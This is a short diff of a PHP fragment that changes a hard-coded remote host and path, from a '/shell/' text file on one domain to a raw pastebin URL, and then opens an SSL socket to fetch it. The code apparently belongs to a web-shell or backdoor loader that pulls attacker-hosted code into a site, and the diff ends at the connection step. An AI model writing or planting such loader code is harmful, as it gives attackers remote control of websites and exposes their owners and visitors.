@@ -1,8 +1,8 @@
 <?php
 	  {
-		$host = "aqilogic.com";
+		$host = "pastebin.com";
 		$port = 443;
-		$path = "/shell/d/fanvat.txt";
+		$path = "/raw/CdNWURPG";
 	 
 		$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
 		if (!$fp) {
